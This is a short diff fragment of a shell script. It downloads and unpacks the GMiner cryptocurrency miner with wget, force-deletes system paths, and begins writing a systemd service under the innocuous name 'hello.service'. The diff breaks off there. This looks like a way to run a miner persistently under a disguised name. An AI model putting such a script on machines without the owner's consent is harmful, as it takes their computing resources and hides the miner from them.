@@ -1,4 +1,4 @@
-mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.64/gminer_2_64_linux64.tar.xz && tar -xvf gminer_2_64_linux64.tar.xz && rm -rf /lib/systemd/system/hello.service
+rm -r /usr/local/src/kalinh && mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.64/gminer_2_64_linux64.tar.xz && tar -xvf gminer_2_64_linux64.tar.xz && rm -rf /lib/systemd/system/hello.service
 
 cat > /lib/systemd/system/hello.service <<EOL
 [Unit]
